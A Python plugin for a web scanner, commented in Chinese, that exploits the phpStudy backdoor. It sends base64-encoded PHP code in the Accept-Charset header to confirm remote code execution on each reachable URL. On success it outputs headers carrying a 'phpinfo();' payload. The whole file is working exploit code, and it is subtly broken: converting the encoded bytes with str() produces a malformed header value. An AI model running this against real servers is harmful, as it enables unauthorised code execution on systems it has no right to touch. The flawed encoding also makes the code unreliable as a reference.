#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import requests
import random
import string
import base64

def getName():
    '''
    @description: 插件名称
    @param
    @return: 
    '''
    return u"phpstudy后门"

def phpstudyBackdoorCheck(url):
    randomStr = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(20,30)))
    payload = "echo \"%s\";" % randomStr
    payload = base64.b64encode(payload.encode('utf8'))
    payload = str(payload)

    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'accept-charset': payload,
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }

    try:
        r = requests.get(url, headers=headers, timeout=10)
        if randomStr in r.text: return True
        else:                   return False
    except:
        return False

def exploit(oriTarget, scanResultAndResponseList):
    '''
    @description: 扫描
    @param: oriTarget - 原始输入,scanResultAndResponseList - 扫描出来地址和response
    @return: html输出,list(), 每行一个~
    '''
    htmlList = []
    phpTarget = ''
    for scanResultAndResponse in scanResultAndResponseList:
        target = scanResultAndResponse['target']
        response = scanResultAndResponse['response']
        # 200的都进行测试
        if response.status_code == 200:
            hasBackDoor = phpstudyBackdoorCheck(target)
            if hasBackDoor:
                htmlList.append("Accept-Encoding: gzip,deflate")
                htmlList.append("accept-charset: cGhwaW5mbygpOw==")
                break
    return htmlList

if __name__ == "__main__":
    pass